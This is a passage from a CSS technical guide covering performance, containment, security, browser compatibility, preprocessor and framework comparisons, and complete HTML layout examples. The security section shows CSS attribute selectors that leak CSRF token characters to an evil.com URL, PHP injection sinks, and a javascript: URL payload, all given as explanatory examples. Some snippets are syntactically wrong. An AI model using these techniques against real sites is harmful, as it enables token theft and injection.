/* Optimized animations */
.optimized-animation {
  /* Use transform instead of position changes */
  animation: slideIn 0.3s ease-out;

  /* Use GPU acceleration */
  will-change: transform;
  backface-visibility: hidden;

  /* Use efficient timing functions */
  animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}

@keyframes slideIn {
  from {
    transform: translateX(-100%);
    opacity: 0;
  }
  to {
    transform: translateX(0);
    opacity: 1;
  }
}

/* Avoid expensive properties in animations */
.expensive-animation {
  /* BAD - These properties trigger layout during animation */
  animation: badAnimation 1s ease-in-out;
}

@keyframes badAnimation {
  from {
    width: 100px; /* Triggers layout every frame */
    height: 50px; /* Triggers layout every frame */
    left: 0; /* Triggers layout every frame */
  }
  to {
    width: 200px; /* Triggers layout every frame */
    height: 100px; /* Triggers layout every frame */
    left: 100px; /* Triggers layout every frame */
  }
}
```

### CSS Containment

CSS containment helps browsers optimize rendering by isolating parts of the page.

```css
/* Layout containment */
.layout-containment {
  contain: layout; /* Browser can optimize layout calculations */
}

/* Paint containment */
.paint-containment {
  contain: paint; /* Browser can optimize paint operations */
}

/* Size containment */
.size-containment {
  contain: size; /* Browser can skip size calculations */
}

/* Style containment */
.style-containment {
  contain: style; /* Browser can optimize style calculations */
}

/* Multiple containment */
.multiple-containment {
  contain: layout paint; /* Combine multiple types */
  contain: layout paint size; /* All three */
  contain: strict; /* All containment types */
  contain: content; /* layout, paint, style */
}

/* Practical usage */
.card-component {
  contain: layout style paint;
  /* This tells the browser:
     - Layout changes won't affect outside elements
     - Style changes won't affect outside elements
     - Paint changes won't affect outside elements
  */
}

.sidebar-widget {
  contain: layout;
  /* Sidebar content can be laid out independently */
}

.image-gallery {
  contain: paint;
  /* Image changes won't affect page layout */
}
```

## 8. Security & Edge Cases

### CSS Injection Prevention

CSS injection can lead to security vulnerabilities like data exfiltration and UI manipulation.

#### Common CSS Injection Vectors

```html
<!-- Vulnerable: Direct style injection -->
<div style="<?php echo $_GET['style']; ?>">Content</div>

<!-- Vulnerable: Class name injection -->
<div class="<?php echo $_GET['class']; ?>">Content</div>

<!-- Vulnerable: CSS file inclusion -->
<link rel="stylesheet" href="<?php echo $_GET['css']; ?>" />
```

#### Prevention Strategies

```css
/* Use CSS Custom Properties with validation */
.safe-properties {
  /* Good: Limited to specific values */
  --theme-color: <?php echo in_array($color, $allowedColors) ? $color : 'blue'; ?>;

  /* Bad: Arbitrary value injection */
  --user-input: <?php echo $_GET['value']; ?>;
}

/* Use Content Security Policy */
/* CSP Header: style-src 'self' 'unsafe-inline' */

/* Sanitize class names */
.sanitized-class {
  /* Only allow alphanumeric, hyphens, underscores */
  class="<?php echo preg_replace('/[^a-zA-Z0-9\-_]/', '', $_GET['class']); ?>";
}
```

#### Data Exfiltration via CSS

```css
/* Dangerous: CSS can exfiltrate data */
/* Attackers can use this to read sensitive information */

/* Example: Reading CSRF tokens */
input[name="csrf_token"][value^="a"] {
  background: url('https://evil.com/steal?a');
}

input[name="csrf_token"][value^="b"] {
  background: url('https://evil.com/steal?b');
}

/* Prevention: Use CSP and limit CSS capabilities */
.safe-approach {
  /* Use nonce-based CSP */
  <style nonce="<?php echo $nonce; ?>">
    /* Safe styles here */
  </style>
}
```

### Inline Style Abuse Prevention

Inline styles can be problematic for security and maintainability.

#### Problems with Inline Styles

```html
<!-- Security issues -->
<div style="background: url('javascript:alert(1)')">XSS via CSS</div>

<!-- Maintainability issues -->
<div style="color: red; font-size: 16px; margin: 10px; padding: 5px;">
  Hard to maintain and override
</div>

<!-- Specificity issues -->
<div style="color: red !important;">
  Difficult to override with external CSS
</div>
```

#### Safe Alternatives

```css
/* Use CSS classes instead of inline styles */
.safe-component {
  /* Define styles in CSS */
  color: var(--text-primary);
  background: var(--bg-primary);
  padding: var(--spacing-md);
}

/* Use CSS custom properties for dynamic values */
.dynamic-component {
  --dynamic-color: var(--user-color, blue);
  background: var(--dynamic-color);
}

/* JavaScript can safely update custom properties */
.element.style.setProperty('--user-color', userColor);
```

### Content Security Policy (CSP)

CSP helps prevent CSS injection attacks by controlling which styles can be loaded.

#### CSP for CSS

```http
/* CSP Headers */
Content-Security-Policy: style-src 'self' https://trusted-cdn.com;
Content-Security-Policy: style-src 'self' 'unsafe-inline';
Content-Security-Policy: style-src 'self' 'nonce-<random-value>';

/* Strict CSP (recommended) */
Content-Security-Policy:
  default-src 'self';
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
```

#### Nonce-based CSP Implementation

```html
<!-- Server generates nonce -->
<?php $nonce = base64_encode(random_bytes(16)); ?>

<!-- HTML with nonce -->
<style nonce="<?php echo $nonce; ?>">
  .safe-style {
    color: blue;
  }
</style>

<!-- CSP Header */
Content-Security-Policy: style-src 'self' 'nonce-<?php echo $nonce; ?>';
```

#### Hash-based CSP

```html
<!-- Inline style with hash -->
<style>
  .example {
    color: red;
  }
</style>

<!-- CSP Header with hash -->
Content-Security-Policy: style-src 'self' 'sha256-<hash-of-style
  >';</hash-of-style
>
```

### Cross-Browser Compatibility

Ensuring consistent behavior across browsers requires understanding browser differences.

#### Vendor Prefixes

```css
/* Modern approach: Use autoprefixer */
.vendor-prefixes {
  /* Autoprefixer will add these automatically */
  display: flex;
  transform: rotate(45deg);
  transition: all 0.3s ease;
}

/* Manual vendor prefixes (legacy) */
.manual-prefixes {
  -webkit-transform: rotate(45deg);
  -moz-transform: rotate(45deg);
  -ms-transform: rotate(45deg);
  -o-transform: rotate(45deg);
  transform: rotate(45deg);
}

/* Feature detection with @supports */
@supports (display: grid) {
  .modern-layout {
    display: grid;
    grid-template-columns: 1fr 1fr;
  }
}

@supports not (display: grid) {
  .fallback-layout {
    display: flex;
    flex-wrap: wrap;
  }
}
```

#### Browser-Specific Issues

```css
/* iOS Safari viewport issues */
.ios-fix {
  /* Prevent zoom on input focus */
  font-size: 16px; /* Minimum to prevent zoom */

  /* Safe area insets for iPhone X+ */
  padding-top: env(safe-area-inset-top);
  padding-left: env(safe-area-inset-left);
  padding-right: env(safe-area-inset-right);
  padding-bottom: env(safe-area-inset-bottom);
}

/* IE11 fallbacks */
.ie11-fallback {
  display: flex;
  display: -ms-flexbox; /* IE10+ */
  -ms-flex-direction: row;
  flex-direction: row;
}

/* Firefox scrollbar styling */
.firefox-scrollbar {
  scrollbar-width: thin;
  scrollbar-color: #888 #f1f1f1;
}

/* Chrome/Safari scrollbar */
.chrome-scrollbar::-webkit-scrollbar {
  width: 8px;
}
```

#### Progressive Enhancement

```css
/* Base styles (work everywhere) */
.base-component {
  display: block;
  width: 100%;
  margin: 1rem 0;
}

/* Enhanced with modern CSS */
@supports (display: grid) {
  .enhanced-component {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
  }
}

@supports (backdrop-filter: blur(10px)) {
  .glass-effect {
    backdrop-filter: blur(10px);
    background: rgba(255, 255, 255, 0.8);
  }
}

/* Fallback for older browsers */
@supports not (backdrop-filter: blur(10px)) {
  .glass-effect {
    background: rgba(255, 255, 255, 0.9);
  }
}
```

### CSS Reset and Normalization

Different browsers have different default styles. Reset or normalize to ensure consistency.

#### CSS Reset

```css
/* Aggressive reset - removes all default styles */
.reset {
  margin: 0;
  padding: 0;
  border: 0;
  font-size: 100%;
  font: inherit;
  vertical-align: baseline;
  list-style: none;
  text-decoration: none;
  box-sizing: border-box;
}

/* Modern reset approach */
*,
*::before,
*::after {
  box-sizing: border-box;
}

* {
  margin: 0;
  padding: 0;
}

html,
body {
  height: 100%;
}

body {
  line-height: 1.5;
  -webkit-font-smoothing: antialiased;
}

img,
picture,
video,
canvas,
svg {
  display: block;
  max-width: 100%;
}

input,
button,
textarea,
select {
  font: inherit;
}
```

#### CSS Normalization

```css
/* Normalize.css approach - preserves useful defaults */
.normalize {
  /* Make elements consistent across browsers */
  html {
    line-height: 1.15;
    -webkit-text-size-adjust: 100%;
  }

  body {
    margin: 0;
    font-family:
      system-ui,
      -apple-system,
      sans-serif;
  }

  main {
    display: block;
  }

  hr {
    box-sizing: content-box;
    height: 0;
    overflow: visible;
  }

  pre {
    font-family: monospace, monospace;
    font-size: 1em;
  }
}
```

## 9. Comparison Section

### CSS vs SASS

#### CSS (Native)

```css
/* Native CSS */
:root {
  --primary-color: #3b82f6;
  --spacing: 1rem;
}

.button {
  background: var(--primary-color);
  padding: var(--spacing);
  border: none;
  border-radius: 4px;
}

.button:hover {
  background: #2563eb;
  transform: translateY(-1px);
}
```

**Pros:**

- No build step required
- Native browser support
- Works everywhere
- Simpler debugging
- Better performance (no compilation)

**Cons:**

- No variables (except custom properties)
- No nesting
- No mixins or functions
- More repetitive code
- Limited logic capabilities

#### SASS/SCSS

```scss
// SASS/SCSS
$primary-color: #3b82f6;
$spacing: 1rem;

@mixin button($bg-color: $primary-color) {
  background: $bg-color;
  padding: $spacing;
  border: none;
  border-radius: 4px;
  transition: all 0.2s ease;

  &:hover {
    background: darken($bg-color, 10%);
    transform: translateY(-1px);
  }
}

.button {
  @include button();
}

.button-secondary {
  @include button(#64748b);
}

// Functions
@function em($pixels, $context: 16px) {
  @return ($pixels / $context) * 1em;
}

.title {
  font-size: em(24px);
}

// Loops
@for $i from 1 through 6 {
  h#{$i} {
    font-size: em(32px - $i * 4px);
  }
}
```

**Pros:**

- Variables, nesting, mixins
- Functions and logic
- Better organization
- Less repetitive code
- Powerful features

**Cons:**

- Requires build step
- Compilation overhead
- More complex debugging
- Learning curve
- Tool dependency

### CSS vs LESS

#### LESS Syntax

```less
// LESS variables
@primary-color: #3b82f6;
@spacing: 1rem;

// LESS mixins
.button(@bg-color: @primary-color) {
  background: @bg-color;
  padding: @spacing;
  border: none;
  border-radius: 4px;

  &:hover {
    background: darken(@bg-color, 10%);
  }
}

// LESS functions
.calculate-size(@base-size) {
  font-size: @base-size * 1.2;
}

// Usage
.button {
  .button();
}

.title {
  .calculate-size(16px);
}
```

**Pros:**

- JavaScript-like syntax
- Dynamic behavior
- Good tooling support
- Client-side compilation option

**Cons:**

- Smaller community than SASS
- Less powerful than SASS
- Requires build step

### CSS vs Tailwind CSS

#### Traditional CSS

```css
/* Traditional CSS approach */
.card {
  background: white;
  border-radius: 8px;
  padding: 1.5rem;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  margin: 1rem 0;
}

.card-header {
  font-size: 1.25rem;
  font-weight: 600;
  margin-bottom: 1rem;
  color: #1f2937;
}

.card-body {
  color: #6b7280;
  line-height: 1.6;
}

<button class="btn btn-primary">
  Click me
</button>
```

#### Tailwind CSS

```html
<!-- Tailwind CSS approach -->
<div class="bg-white rounded-lg p-6 shadow-md my-4">
  <h3 class="text-xl font-semibold mb-4 text-gray-800">Card Title</h3>
  <p class="text-gray-600 leading-relaxed">Card content goes here.</p>
</div>

<button
  class="bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 px-4 rounded transition-colors"
>
  Click me
</button>
```

**Tailwind CSS Pros:**

- Rapid development
- Consistent design system
- No custom CSS needed for common patterns
- Responsive utilities built-in
- Small production bundle (PurgeCSS)
- Better maintainability for utility classes

**Tailwind CSS Cons:**

- HTML can become cluttered
- Learning curve for utility classes
- Less semantic HTML
- Requires build step
- Can be verbose for complex components

### CSS vs CSS-in-JS

#### Traditional CSS

```css
/* styles.css */
.button {
  background: var(--primary-color);
  color: white;
  padding: 0.5rem 1rem;
  border: none;
  border-radius: 4px;
}

.button:hover {
  background: var(--primary-color-dark);
}
```

#### Styled Components (CSS-in-JS)

```javascript
// Styled Components
import styled, { ThemeProvider } from "styled-components";

const Button = styled.button`
  background: ${(props) => props.theme.colors.primary};
  color: white;
  padding: 0.5rem 1rem;
  border: none;
  border-radius: 4px;
  transition: all 0.2s ease;

  &:hover {
    background: ${(props) => props.theme.colors.primaryDark};
  }

  ${(props) =>
    props.variant === "outline" &&
    `
    background: transparent;
    border: 2px solid ${props.theme.colors.primary};
    color: ${props.theme.colors.primary};
  `}
`;

// Usage
function App() {
  return (
    <ThemeProvider theme={theme}>
      <Button variant="outline">Click me</Button>
    </ThemeProvider>
  );
}
```

**CSS-in-JS Pros:**

- Scoped styles by default
- Dynamic styling with JavaScript
- Better component encapsulation
- Theme support
- No class name conflicts
- Dead code elimination

**CSS-in-JS Cons:**

- Runtime overhead
- Larger bundle size
- More complex debugging
- Requires JavaScript
- Slower initial render

### CSS vs Inline Styles

#### External CSS

```css
/* styles.css */
.highlight {
  background: yellow;
  color: black;
  padding: 1rem;
  border-radius: 4px;
}
```

```html
<div class="highlight">Content</div>
```

#### Inline Styles

```html
<div
  style="background: yellow; color: black; padding: 1rem; border-radius: 4px;"
>
  Content
</div>
```

**External CSS Pros:**

- Separation of concerns
- Better caching
- Reusable styles
- Easier maintenance
- Better performance

**External CSS Cons:**

- Extra HTTP request
- Global scope
- Potential conflicts

**Inline Styles Pros:**

- No extra HTTP request
- High specificity
- Dynamic values
- Component-scoped

**Inline Styles Cons:**

- No caching
- Verbose HTML
- Maintenance nightmare
- No pseudo-classes
- Poor performance

### Performance Comparison

```javascript
// Performance characteristics
const performanceComparison = {
  "Native CSS": {
    bundleSize: "Minimal",
    runtimeCost: "None",
    parseTime: "Fast",
    cacheability: "Excellent",
    devExperience: "Good",
  },
  "SASS/SCSS": {
    bundleSize: "Small (compiled)",
    runtimeCost: "None",
    parseTime: "Fast",
    cacheability: "Excellent",
    devExperience: "Excellent",
  },
  "Tailwind CSS": {
    bundleSize: "Small (purged)",
    runtimeCost: "None",
    parseTime: "Fast",
    cacheability: "Excellent",
    devExperience: "Good",
  },
  "CSS-in-JS": {
    bundleSize: "Large",
    runtimeCost: "High",
    parseTime: "Slow",
    cacheability: "Poor",
    devExperience: "Excellent",
  },
  "Inline Styles": {
    bundleSize: "Large (HTML)",
    runtimeCost: "None",
    parseTime: "Slow",
    cacheability: "Poor",
    devExperience: "Poor",
  },
};
```

### When to Use Which Approach

#### Use Native CSS When:

- Simple websites or applications
- Performance is critical
- No build process available
- Team has limited CSS experience
- Maintaining legacy code

#### Use SASS/SCSS When:

- Large-scale applications
- Complex design systems
- Team prefers traditional CSS workflow
- Need for preprocessing features
- Build process already in place

#### Use Tailwind CSS When:

- Rapid prototyping
- Consistent design system needed
- Team prefers utility-first approach
- Small to medium applications
- Custom design system not required

#### Use CSS-in-JS When:

- Component-based architecture (React/Vue)
- Dynamic theming required
- Component isolation critical
- Team comfortable with JavaScript
- Styled components preferred

#### Use Inline Styles When:

- Dynamic values required
- Component libraries
- Email templates
- Quick prototypes
- One-off style calculations

---

_Sections 7-9 complete. This section covers browser internals, security considerations, and comprehensive comparisons between different CSS approaches. Each topic includes practical examples and decision-making frameworks for choosing the right approach for different scenarios._

## 10. Code Examples

### Basic CSS Example

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Basic CSS Example</title>
    <style>
      /* Reset and base styles */
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family:
          system-ui,
          -apple-system,
          sans-serif;
        line-height: 1.6;
        color: #333;
        background: #f8fafc;
      }

      /* Container */
      .container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 0 1rem;
      }

      /* Header */
      .header {
        background: white;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        position: sticky;
        top: 0;
        z-index: 100;
      }

      .nav {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 1rem 0;
      }

      .logo {
        font-size: 1.5rem;
        font-weight: bold;
        color: #3b82f6;
        text-decoration: none;
      }

      .nav-links {
        display: flex;
        list-style: none;
        gap: 2rem;
      }

      .nav-links a {
        text-decoration: none;
        color: #64748b;
        font-weight: 500;
        transition: color 0.2s ease;
      }

      .nav-links a:hover {
        color: #3b82f6;
      }

      /* Main content */
      .main {
        padding: 3rem 0;
      }

      .hero {
        text-align: center;
        padding: 4rem 0;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border-radius: 1rem;
        margin-bottom: 3rem;
      }

      .hero h1 {
        font-size: 3rem;
        margin-bottom: 1rem;
        font-weight: 700;
      }

      .hero p {
        font-size: 1.25rem;
        margin-bottom: 2rem;
        opacity: 0.9;
      }

      .btn {
        display: inline-block;
        padding: 0.75rem 2rem;
        background: white;
        color: #3b82f6;
        text-decoration: none;
        border-radius: 0.5rem;
        font-weight: 600;
        transition: all 0.2s ease;
        border: none;
        cursor: pointer;
      }

      .btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
      }

      /* Cards */
      .cards {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
        gap: 2rem;
        margin-bottom: 3rem;
      }

      .card {
        background: white;
        padding: 2rem;
        border-radius: 0.75rem;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        transition:
          transform 0.2s ease,
          box-shadow 0.2s ease;
      }

      .card:hover {
        transform: translateY(-4px);
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
      }

      .card h3 {
        font-size: 1.5rem;
        margin-bottom: 1rem;
        color: #1f2937;
      }

      .card p {
        color: #6b7280;
        margin-bottom: 1.5rem;
      }

      /* Footer */
      .footer {
        background: #1f2937;
        color: white;
        padding: 2rem 0;
        text-align: center;
      }

      /* Responsive design */
      @media (max-width: 768px) {
        .nav {
          flex-direction: column;
          gap: 1rem;
        }

        .nav-links {
          gap: 1rem;
        }

        .hero h1 {
          font-size: 2rem;
        }

        .hero p {
          font-size: 1rem;
        }

        .cards {
          grid-template-columns: 1fr;
        }
      }
    </style>
  </head>
  <body>
    <header class="header">
      <nav class="nav container">
        <a href="#" class="logo">CSS Guide</a>
        <ul class="nav-links">
          <li><a href="#home">Home</a></li>
          <li><a href="#features">Features</a></li>
          <li><a href="#about">About</a></li>
          <li><a href="#contact">Contact</a></li>
        </ul>
      </nav>
    </header>

    <main class="main container">
      <section class="hero">
        <h1>Welcome to CSS Mastery</h1>
        <p>Learn modern CSS with practical examples and best practices</p>
        <a href="#features" class="btn">Get Started</a>
      </section>

      <section class="cards" id="features">
        <div class="card">
          <h3>🎨 Modern Design</h3>
          <p>
            Learn the latest CSS features including Grid, Flexbox, and Custom
            Properties for creating beautiful, responsive designs.
          </p>
          <a href="#" class="btn">Learn More</a>
        </div>
        <div class="card">
          <h3>⚡ Performance</h3>
          <p>
            Master CSS optimization techniques to ensure your websites load fast
            and run smoothly across all devices.
          </p>
          <a href="#" class="btn">Learn More</a>
        </div>
        <div class="card">
          <h3>🔧 Best Practices</h3>
          <p>
            Discover industry-standard approaches to CSS architecture,
            maintainability, and scalable code organization.
          </p>
          <a href="#" class="btn">Learn More</a>
        </div>
      </section>
    </main>

    <footer class="footer">
      <div class="container">
        <p>&copy; 2024 CSS Technical Guide. Built with modern CSS.</p>
      </div>
    </footer>
  </body>
</html>
```

### Flexbox Layout Example

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Flexbox Layout Example</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family:
          system-ui,
          -apple-system,
          sans-serif;
        background: #f3f4f6;
        padding: 2rem;
      }

      /* Flexbox container examples */
      .example-section {
        background: white;
        border-radius: 0.5rem;
        padding: 2rem;
        margin-bottom: 2rem;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      }

      .example-title {
        font-size: 1.5rem;
        margin-bottom: 1rem;
        color: #1f2937;
      }

      .flex-container {
        display: flex;
        background: #e5e7eb;
        padding: 1rem;
        border-radius: 0.25rem;
        min-height: 100px;
        margin-bottom: 1rem;
      }

      .flex-item {
        background: #3b82f6;
        color: white;
        padding: 1rem;
        margin: 0.25rem;
        border-radius: 0.25rem;
        text-align: center;
        font-weight: 600;
      }

      /* Basic flexbox */
      .basic-flex .flex-item {
        flex: 1;
      }

      /* Direction examples */
      .flex-row {
        flex-direction: row;
      }

      .flex-column {
        flex-direction: column;
        height: 200px;
      }

      .flex-row-reverse {
        flex-direction: row-reverse;
      }

      /* Justify content examples */
      .justify-start {
        justify-content: flex-start;
      }

      .justify-center {
        justify-content: center;
      }

      .justify-end {
        justify-content: flex-end;
      }

      .justify-between {
        justify-content: space-between;
      }

      .justify-around {
        justify-content: space-around;
      }

      .justify-evenly {
        justify-content: space-evenly;
      }

      /* Align items examples */
      .align-start {
        align-items: flex-start;
        height: 150px;
      }

      .align-center {
        align-items: center;
        height: 150px;
      }

      .align-end {
        align-items: flex-end;
        height: 150px;
      }

      .align-stretch {
        align-items: stretch;
        height: 150px;
      }

      .align-stretch .flex-item {
        align-self: stretch;
      }

      /* Flex wrap examples */
      .flex-wrap {
        flex-wrap: wrap;
      }

      .flex-nowrap {
        flex-wrap: nowrap;
      }

      .flex-wrap-reverse {
        flex-wrap: wrap-reverse;
      }

      /* Individual flex item control */
      .flex-grow-1 .item-1 {
        flex-grow: 1;
      }

      .flex-grow-2 .item-2 {
        flex-grow: 2;
      }

      .flex-shrink .item-3 {
        flex-shrink: 0;
        width: 200px;
      }

      .flex-basis .item-1 {
        flex-basis: 200px;
      }

      .flex-basis .item-2 {
        flex-basis: 300px;
      }

      /* Holy grail layout */
      .holy-grail {
        display: flex;
        flex-direction: column;
        min-height: 100vh;
      }

      .holy-grail header {
        background: #3b82f6;
        color: white;
        padding: 1rem;
        text-align: center;
      }

      .holy-grail .content {
        display: flex;
        flex: 1;
      }

      .holy-grail nav {
        background: #64748b;
        color: white;
        padding: 1rem;
        flex: 0 0 200px;
      }

      .holy-grail main {
        flex: 1;
        padding: 1rem;
        background: white;
      }

      .holy-grail aside {
        background: #64748b;
        color: white;
        padding: 1rem;
        flex: 0 0 200px;
      }

      .holy-grail footer {
        background: #1f2937;
        color: white;
        padding: 1rem;
        text-align: center;
      }

      /* Responsive navigation */
      .responsive-nav {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background: #1f2937;
        color: white;
        padding: 1rem;
      }

      .nav-brand {
        font-size: 1.25rem;
        font-weight: bold;
      }

      .nav-menu {
        display: flex;
        list-style: none;
        gap: 2rem;
      }

      .nav-menu a {
        color: white;
        text-decoration: none;
        padding: 0.5rem 1rem;
        border-radius: 0.25rem;
        transition: background 0.2s ease;
      }

      .nav-menu a:hover {
        background: rgba(255, 255, 255, 0.1);
      }

      @media (max-width: 768px) {
        .responsive-nav {
          flex-direction: column;
          gap: 1rem;
        }

        .nav-menu {
          flex-direction: column;
          gap: 0.5rem;
          width: 100%;
        }

        .nav-menu a {
          text-align: center;
        }
      }

      /* Card layout */
      .card-layout {
        display: flex;
        flex-wrap: wrap;
        gap: 1rem;
      }

      .card {
        flex: 1 1 300px;
        background: white;
        border: 1px solid #e5e7eb;
        border-radius: 0.5rem;
        padding: 1.5rem;
        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
      }

      .card h4 {
        margin-bottom: 0.5rem;
        color: #1f2937;
      }

      .card p {
        color: #6b7280;
        line-height: 1.5;
      }
    </style>
  </head>
  <body>
    <!-- Basic Flexbox -->
    <div class="example-section">
      <h2 class="example-title">Basic Flexbox</h2>
      <div class="flex-container basic-flex">
        <div class="flex-item">Item 1</div>
        <div class="flex-item">Item 2</div>
        <div class="flex-item">Item 3</div>
      </div>
    </div>

    <!-- Flex Direction -->
    <div class="example-section">
      <h2 class="example-title">Flex Direction</h2>
      <h3>Row (Default)</h3>
      <div class="flex-container flex-row">
        <div class="flex-item">Item 1</div>
        <div class="flex-item">Item 2</div>
        <div class="flex-item">Item 3</div>
      </div>

      <h3>Column</h3>
      <div class="flex-container flex-column">
        <div class="flex-item">Item 1</div>
        <div class="flex-item">Item 2</div>
        <div class="flex-item">Item 3</div>
      </div>

      <h3>Row Reverse</h3>
      <div class="flex-container flex-row-reverse">
        <div class="flex-item">Item 1</div>
        <div class="flex-item">Item 2</div>
        <div class="flex-item">Item 3</div>
      </div>
    </div>

    <!-- Holy Grail Layout -->
    <div class="example-section">
      <h2 class="example-title">Holy Grail Layout</h2>
      <div class="holy-grail">
        <header>Header</header>
        <div class="content">
          <nav>Navigation</nav>
          <main>Main Content</main>
          <aside>Sidebar</aside>
        </div>
        <footer>Footer</footer>
      </div>
    </div>

    <!-- Responsive Navigation -->
    <div class="example-section">
      <h2 class="example-title">Responsive Navigation</h2>
      <nav class="responsive-nav">
        <div class="nav-brand">MyWebsite</div>
        <ul class="nav-menu">
          <li><a href="#">Home</a></li>
          <li><a href="#">About</a></li>
          <li><a href="#">Services</a></li>
          <li><a href="#">Contact</a></li>
        </ul>
      </nav>
    </div>

    <!-- Card Layout -->
    <div class="example-section">
      <h2 class="example-title">Responsive Card Layout</h2>
      <div class="card-layout">
        <div class="card">
          <h4>Card 1</h4>
          <p>
            This is a flexible card that adapts to different screen sizes using
            flexbox.
          </p>
        </div>
        <div class="card">
          <h4>Card 2</h4>
          <p>Cards automatically wrap and resize based on available space.</p>
        </div>
        <div class="card">
          <h4>Card 3</h4>
          <p>
            Each card has a minimum width of 300px but can grow to fill space.
          </p>
        </div>
        <div class="card">
          <h4>Card 4</h4>
          <p>
            Flexbox makes it easy to create responsive layouts without media
            queries.
          </p>
        </div>
      </div>
    </div>
  </body>
</html>
```

### Responsive Design Example

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Responsive Design Example</title>
    <style>
      /* CSS Variables for theming */
      :root {
        --primary-color: #3b82f6;
        --secondary-color: #64748b;
        --success-color: #10b981;
        --warning-color: #f59e0b;
        --error-color: #ef4444;
        --text-primary: #1f2937;
        --text-secondary: #6b7280;
        --bg-primary: #ffffff;
        --bg-secondary: #f8fafc;
        --border-color: #e5e7eb;
        --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
        --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.1);
        --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);
        --radius-sm: 0.25rem;
        --radius-md: 0.5rem;
        --radius-lg: 1rem;
        --transition: all 0.2s ease;
      }

      /* Base styles */
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      html {
        font-size: 16px;
        scroll-behavior: smooth;
      }

      body {
        font-family:
          system-ui,
          -apple-system,
          sans-serif;
        line-height: 1.6;
        color: var(--text-primary);
        background: var(--bg-secondary);
      }

      /* Fluid typography */
      h1 {
        font-size: clamp(2rem, 5vw, 3.5rem);
        font-weight: 700;
        line-height: 1.2;
        margin-bottom: 1rem;
      }

      h2 {
        font-size: clamp(1.5rem, 4vw, 2.5rem);
        font-weight: 600;
        line-height: 1.3;
        margin-bottom: 1rem;
      }

      p {
        font-size: clamp(1rem, 2vw, 1.125rem);
        margin-bottom: 1rem;
        color: var(--text-secondary);
      }

      /* Container with fluid sizing */
      .container {
        width: 100%;
        max-width: clamp(320px, 90%, 1200px);
        margin: 0 auto;
        padding: 0 clamp(1rem, 4vw, 2rem);
      }

      /* Header with responsive navigation */
      header {
        background: var(--bg-primary);
        box-shadow: var(--shadow-sm);
        position: sticky;
        top: 0;
        z-index: 100;
      }

      nav {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: clamp(0.75rem, 2vw, 1.5rem) 0;
      }

      .logo {
        font-size: clamp(1.25rem, 3vw, 1.75rem);
        font-weight: bold;
        color: var(--primary-color);
        text-decoration: none;
      }

      .nav-menu {
        display: flex;
        list-style: none;
        gap: clamp(1rem, 3vw, 2rem);
      }

      .nav-menu a {
        color: var(--text-primary);
        text-decoration: none;
        font-weight: 500;
        padding: 0.5rem 1rem;
        border-radius: var(--radius-md);
        transition: var(--transition);
      }

      .nav-menu a:hover {
        background: var(--primary-color);
        color: white;
      }

      .mobile-menu-toggle {
        display: none;
        background: none;
        border: none;
        font-size: 1.5rem;
        cursor: pointer;
        color: var(--text-primary);
      }

      /* Hero section with fluid spacing */
      .hero {
        background: linear-gradient(135deg, var(--primary-color), #8b5cf6);
        color: white;
        padding: clamp(3rem, 10vh, 8rem) 0;
        text-align: center;
        margin-bottom: clamp(2rem, 5vh, 4rem);
      }

      .hero h1 {
        margin-bottom: clamp(1rem, 3vw, 2rem);
      }

      .hero p {
        font-size: clamp(1.125rem, 3vw, 1.5rem);
        color: rgba(255, 255, 255, 0.9);
        margin-bottom: clamp(1.5rem, 4vw, 2.5rem);
      }

      /* Buttons with responsive sizing */
      .btn {
        display: inline-block;
        padding: clamp(0.75rem, 2vw, 1rem) clamp(1.5rem, 4vw, 2.5rem);
        background: white;
        color: var(--primary-color);
        text-decoration: none;
        border-radius: var(--radius-md);
        font-weight: 600;
        font-size: clamp(1rem, 2vw, 1.125rem);
        transition: var(--transition);
        border: none;
        cursor: pointer;
      }

      .btn:hover {
        transform: translateY(-2px);
        box-shadow: var(--shadow-lg);
      }

      /* Responsive grid layout */
      .features {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
        gap: clamp(1.5rem, 4vw, 3rem);
        margin-bottom: clamp(3rem, 8vh, 6rem);
      }

      .feature-card {
        background: var(--bg-primary);
        padding: clamp(1.5rem, 4vw, 2.5rem);
        border-radius: var(--radius-lg);
        box-shadow: var(--shadow-md);
        text-align: center;
        transition: var(--transition);
      }

      .feature-card:hover {
        transform: translateY(-4px);
        box-shadow: var(--shadow-lg);
      }

      .feature-icon {
        font-size: clamp(2.5rem, 6vw, 4rem);
        margin-bottom: clamp(1rem, 3vw, 1.5rem);
      }

      /* Responsive behavior */
      @media (max-width: 768px) {
        .mobile-menu-toggle {
          display: block;
        }

        .nav-menu {
          position: fixed;
          top: 0;
          right: -100%;
          width: 80%;
          height: 100vh;
